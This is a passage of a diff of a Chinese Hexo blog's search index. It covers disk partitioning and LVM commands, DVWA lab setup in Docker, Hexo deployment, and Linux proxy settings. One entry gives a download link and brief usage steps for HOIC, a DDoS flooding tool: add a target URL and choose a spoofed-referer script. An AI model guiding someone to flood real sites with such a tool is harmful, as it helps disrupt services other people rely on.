class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
-<h2 id="逻辑卷">逻辑卷</h2>
-<p>创建常用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
-<p>删除常用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
-<h2 id="常见错误">常见错误</h2>
-<h3 id="设备或资源忙">设备或资源忙</h3>
-<p>如果有返回：</p>
-<pre><code>The partition table has been altered!
-
-Calling ioctl() to re-read partition table.
-
-WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
-The kernel still uses the old table. The new table will be used at
-the next reboot or after you run partprobe(8) or kpartx(8)
+    <title>dvwa-部署（docker）</title>
+    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="拉取镜像">拉取镜像</h2>
+<p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
+<pre><code>https://hub.docker.com/
 </code></pre>
-<p>重新识别磁盘即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
-]]></content>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+<h2 id="运行容器">运行容器</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+<p>默认账号密码</p>
+<pre><code>dvwa/dvwa
+admin/password
+</code></pre>
+<h2 id="许可证">许可证</h2>
+<p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+<p>网上的使用方法<br>
+在DVWA-master/config/config.inc.php文件中找到下面代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
+<p>将其修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-        <category>命令</category>
+        <category>网络安全</category>
+        <category>dvwa</category>
       </categories>
       <tags>
-        <tag>linux命令</tag>
+        <tag>docker</tag>
+        <tag>dvwa</tag>
       </tags>
   </entry>
   <entry>
@@ -1723,6 +1681,124 @@ Repository name <a href="http://xn--fiq51fkycnswykwlh0b.github.io">中输入用�
       <tags>
         <tag>博客</tag>
         <tag>github</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo-gitee部署</title>
+    <url>/2025/06/20/hexo-gitee%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h2 id="导语">导语</h2>
+<p>与github的部署方式一样，仅是代码仓库的设置有些许不同，并且gitee上需要单独开启gitee pages，并且要实名认证，目前<code>pages服务暂停了</code>。</p>
+<blockquote>
+<p>gitee pages已暂停服务，无法通过其访问</p>
+<blockquote>
+<p>参考文章：<a href="https://cloud.tencent.com/developer/article/2495238">https://cloud.tencent.com/developer/article/2495238</a></p>
+</blockquote>
+</blockquote>
+<hr>
+<h2 id="配置方法">配置方法</h2>
+<p>hexo的创建和deploy的配置和github一样，可以参考<a href="/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/">github部署hexo</a></p>
+<ul>
+<li>注意git name和email</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的 gitee 用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的 gitee 邮箱&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="创建仓库">创建仓库</h3>
+<p>创建gitee仓库，需要注意一点不一样的是，仓库名称不需要和github一样格式<br>
+我起的名称是haha_w</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github:	&#123;username&#125;.github.io</span><br><span class="line">gitee:	&#123;username&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="修改yml">修改yml</h3>
+<p>根目录中<code>_config.yml</code>的deploy的配置需要修改一下，这样可以同时更新两个仓库</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/haha_w/haha_w.git,master</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:w00123/w00123.github.io.git,master</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure>
+<h3 id="创建SSH-key">创建SSH key</h3>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;<span class="number">15967126</span>+haha_w@user.noreply.gitee.com&quot;</span><br></pre></td></tr></table></figure>
+<p>上传公钥到gitee，测试可以用以下命令测试：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
+<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>完成配置</p>
+</div>
+<hr>
+<h2 id="上传代码仓库">上传代码仓库</h2>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>gitee</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>分区命令</title>
+    <url>/2025/01/15/fdisk/</url>
+    <content><![CDATA[<h2 id="fdisk">fdisk</h2>
+<h3 id="命令格式">命令格式</h3>
+<p>fdisk 路径 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
+<p>一般配合使用的有<br>
+df -h<br>
+lsblk<br>
+mkfs.ext4<br>
+…</p>
+<h3 id="帮助">帮助</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
+<h2 id="逻辑卷">逻辑卷</h2>
+<p>创建常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
+<p>删除常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
+<h2 id="常见错误">常见错误</h2>
+<h3 id="设备或资源忙">设备或资源忙</h3>
+<p>如果有返回：</p>
+<pre><code>The partition table has been altered!
+
+Calling ioctl() to re-read partition table.
+
+WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
+The kernel still uses the old table. The new table will be used at
+the next reboot or after you run partprobe(8) or kpartx(8)
+</code></pre>
+<p>重新识别磁盘即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>linux命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo-github贡献日历</title>
+    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
+    <content><![CDATA[<h2 id="预览">预览</h2>
+<p><img src="/images/pasted-84.png" alt="upload successful"></p>
+<h2 id="安装依赖">安装依赖</h2>
+<p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
+<h2 id="添加配置">添加配置</h2>
+<p>要放到hexo根目录下_config.yml文件，非主题:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="自建api">自建api</h2>
+<blockquote>
+<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>
+测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
+</blockquote>
+<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
+</div>
+<h2 id="记录500错误处理方法">记录500错误处理方法</h2>
+<h4 id="进入项目选择setting">进入项目选择setting</h4>
+<p>下拉找到<code>Node.js Version</code>修改版本为18.0<br>
+<img src="/images/pasted-82.png" alt="upload successful"></p>
+<h4 id="重新部署">重新部署</h4>
+<p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br>
+<img src="/images/pasted-83.png" alt="upload successful"></p>
+]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
         <tag>hexo</tag>
       </tags>
   </entry>
@@ -1857,82 +1933,6 @@ vim custom.css</p>
       </tags>
   </entry>
   <entry>
-    <title>hexo-gitee部署</title>
-    <url>/2025/06/20/hexo-gitee%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h2 id="导语">导语</h2>
-<p>与github的部署方式一样，仅是代码仓库的设置有些许不同，并且gitee上需要单独开启gitee pages，并且要实名认证，目前<code>pages服务暂停了</code>。</p>
-<blockquote>
-<p>gitee pages已暂停服务，无法通过其访问</p>
-<blockquote>
-<p>参考文章：<a href="https://cloud.tencent.com/developer/article/2495238">https://cloud.tencent.com/developer/article/2495238</a></p>
-</blockquote>
-</blockquote>
-<hr>
-<h2 id="配置方法">配置方法</h2>
-<p>hexo的创建和deploy的配置和github一样，可以参考<a href="/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/">github部署hexo</a></p>
-<ul>
-<li>注意git name和email</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的 gitee 用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的 gitee 邮箱&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="创建仓库">创建仓库</h3>
-<p>创建gitee仓库，需要注意一点不一样的是，仓库名称不需要和github一样格式<br>
-我起的名称是haha_w</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github:	&#123;username&#125;.github.io</span><br><span class="line">gitee:	&#123;username&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="修改yml">修改yml</h3>
-<p>根目录中<code>_config.yml</code>的deploy的配置需要修改一下，这样可以同时更新两个仓库</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/haha_w/haha_w.git,master</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:w00123/w00123.github.io.git,master</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure>
-<h3 id="创建SSH-key">创建SSH key</h3>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;<span class="number">15967126</span>+haha_w@user.noreply.gitee.com&quot;</span><br></pre></td></tr></table></figure>
-<p>上传公钥到gitee，测试可以用以下命令测试：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
-<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>完成配置</p>
-</div>
-<hr>
-<h2 id="上传代码仓库">上传代码仓库</h2>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>gitee</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo-github贡献日历</title>
-    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
-    <content><![CDATA[<h2 id="预览">预览</h2>
-<p><img src="/images/pasted-84.png" alt="upload successful"></p>
-<h2 id="安装依赖">安装依赖</h2>
-<p>执行命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
-<h2 id="添加配置">添加配置</h2>
-<p>要放到hexo根目录下_config.yml文件，非主题:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="自建api">自建api</h2>
-<blockquote>
-<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>
-测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
-</blockquote>
-<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
-</div>
-<h2 id="记录500错误处理方法">记录500错误处理方法</h2>
-<h4 id="进入项目选择setting">进入项目选择setting</h4>
-<p>下拉找到<code>Node.js Version</code>修改版本为18.0<br>
-<img src="/images/pasted-82.png" alt="upload successful"></p>
-<h4 id="重新部署">重新部署</h4>
-<p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br>
-<img src="/images/pasted-83.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo-书写</title>
     <url>/2025/02/08/hexo-%E4%B9%A6%E5%86%99/</url>
     <content><![CDATA[<h2 id="常用书写">常用书写</h2>
@@ -2045,6 +2045,31 @@ vim custom.css</p>
       </tags>
   </entry>
   <entry>
+    <title>hoic高射炮工具</title>
+    <url>/2025/06/22/hoic%E9%AB%98%E5%B0%84%E7%82%AE%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="安装">安装</h2>
+<p>下载地址：</p>
+<blockquote>
+<p><a href="https://sourceforge.net/projects/high-orbit-ion-cannon/">https://sourceforge.net/projects/high-orbit-ion-cannon/</a><br>
+官网报有可能有恶意文件，理论上黑客软件很正常会有这个提示，但是看选择是否下载</p>
+</blockquote>
+<h2 id="使用">使用</h2>
+<ol>
+<li>解压后运行exe</li>
+<li>选择<code>+号</code>添加url</li>
+<li>可选择脚本第一个为伪造来源，后面的可以试试</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+        <tag>网络安全</tag>
+        <tag>hoic</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo博客安装方法</title>
     <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<h2 id="termux">termux</h2>
@@ -2076,31 +2101,6 @@ vim themes/butterfly/_config.yml</p>
       <tags>
         <tag>博客</tag>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hoic高射炮工具</title>
-    <url>/2025/06/22/hoic%E9%AB%98%E5%B0%84%E7%82%AE%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="安装">安装</h2>
-<p>下载地址：</p>
-<blockquote>
-<p><a href="https://sourceforge.net/projects/high-orbit-ion-cannon/">https://sourceforge.net/projects/high-orbit-ion-cannon/</a><br>
-官网报有可能有恶意文件，理论上黑客软件很正常会有这个提示，但是看选择是否下载</p>
-</blockquote>
-<h2 id="使用">使用</h2>
-<ol>
-<li>解压后运行exe</li>
-<li>选择<code>+号</code>添加url</li>
-<li>可选择脚本第一个为伪造来源，后面的可以试试</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-        <tag>网络安全</tag>
-        <tag>hoic</tag>
       </tags>
   </entry>
   <entry>
@@ -2274,6 +2274,36 @@ t 替换为 7<br>
       </tags>
   </entry>
   <entry>
+    <title>linux-代理设置方法</title>
+    <url>/2025/02/08/linux-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="centos">centos</h2>
+<h3 id="临时">临时</h3>
+<p>通过以下命令实现临时使用代理服务器：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="永久">永久</h3>
+<p>通过修改profile文件实现：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
+<p>末尾添加以下内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
+<p>执行生效命令即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
+<h2 id="kali">kali</h2>
+<p>使用proxychains4代理，与上述类似，安装：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install proxychains4</span><br></pre></td></tr></table></figure>
+<p>修改末尾的代理服务器端口即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+<p>使用方法是命令前加上proxychains4即可</p>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>网络代理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kali移动端（root安装，不改内核）</title>
     <url>/2024/10/15/kali/</url>
     <content><![CDATA[<h2 id="简介">简介</h2>
@@ -2307,36 +2337,6 @@ t 替换为 7<br>
       </tags>
   </entry>
   <entry>
-    <title>linux-代理设置方法</title>
-    <url>/2025/02/08/linux-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="centos">centos</h2>
-<h3 id="临时">临时</h3>
-<p>通过以下命令实现临时使用代理服务器：</p>
